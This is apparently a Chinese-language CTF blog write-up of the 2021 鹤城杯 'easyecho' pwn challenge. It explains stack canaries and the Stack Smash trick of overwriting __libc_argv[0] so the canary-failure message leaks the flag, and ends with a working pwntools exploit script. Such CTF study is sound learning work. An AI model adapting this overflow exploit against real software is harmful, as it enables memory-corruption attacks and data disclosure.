---
title: '[2021 鹤城杯] easyecho 栈溢出与 Stack Smash 利用复现'
description: '记录 2021 鹤城杯 easyecho pwn 题的 Canary 机制、Stack Smash 思路、libc argv[0] 覆盖与 flag 输出利用流程。'
tags:
  - CTF
  - stack-overflow
  - canary
  - libc
  - pwn
categories:
  - pwn
date: '2025-10-27 00:46:39'
abbrlink: b0d9806f
permalink: posts/2021-hechengbei-easyecho-stack-smash/
top_img: transparent
---
# <font style="color:rgb(34, 34, 38);">Stack Smash</font>
Canary保护，是在栈上插入一段随机数；进入函数后，也就是call完后会有push ebp，mov ebp，esp，最后来个mov esp。canary保护特殊在上述操作后会再加一个canary。最后函数leave ret前会检测一次，canary与原先值是否相同来判断是否被栈溢出覆盖返回地址了。

Stack Smash 就是利用 canary 检测的机制漏洞将栈上的__libc_argv[0] 内容将其输出

### 注意在libc2.23 后此机制无法使用
```c
void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```


![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_0.png)

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_1.png)

程序大致内容就是输入用户名 name 并且输出出来，当后续输入backdoor 调用p_sub_CF0->sub_CF0，打开 flag 文件，将其内容存入 bss 段

后续我们只需要将_libc_argv[0] 内容修改为 flag_bss 的地址，我们就可以通过报错信息输出 flag 了

我们现在的流程就是 获取真实地址计算出 flag 的地址，计算到__libc_argv[0] 的偏移



![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_2.png)

我们可以利用输入 name 的函数输出栈上其他地址算出程序的基地址

![](https://misakiimg.oss-cn-shanghai.aliyuncs.com/img/%5B2021%20%E9%B9%A4%E5%9F%8E%E6%9D%AF%5Deasyecho_3.png)

由于本地换 libc 上去程序直接崩了，这边看了别的师傅的 wp，输入点 gets 到到__libc_argv[0] 的偏移为 0x168

```c
from pwn import * #引用pwntools库
from ctypes import *
from LibcSearcher import *


misaki=1
if misaki:
    context(log_level='debug',arch='amd64',os='linux')
else:
    context(log_level='debug',arch='i386',os='linux')
    
ming=0
if ming:
    p=remote('node7.anna.nssctf.cn',28194)#配置远程连接#node7.anna.nssctf.cn:28194
else:
    p=process("./pwn")#配置本地连接:


s = lambda data : p.send(data)
sa  = lambda text,data  :p.sendafter(text, data)
sl  = lambda data   :p.sendline(data)
sla = lambda text,data  :p.sendlineafter(text, data)
r   = lambda num=4096   :p.recv(num)
rl  = lambda text   :p.recvuntil(text)
def m(): gdb.attach(p)

elf=ELF("./pwn")
libc=ELF("./libc.so.6")
##############################################################################################
rl(b'name~')
s(b'a'*0x10)
m()
rl(b'a'*0x10)
addr=u64(p.recv(6).ljust(8,b'\x00'))
print(f'addr={hex(addr)}')
base_addr=addr-0xcf0
print(f'base_addr={hex(base_addr)}')
flag_addr=0x202040+base_addr
payload=b'a'*0x168+p64(base_addr+0x202040)
argv0=0x7ffddc003588
v10=0x7ffddc003420
padding=(argv0-v10)*b'b'
sla(b'Input: ',b'backdoor\x00')
sla(b'Input: ',padding+p64(flag_addr))
sla(b'Input: ',b'exitexit')
p.interactive()#与程序交互
```



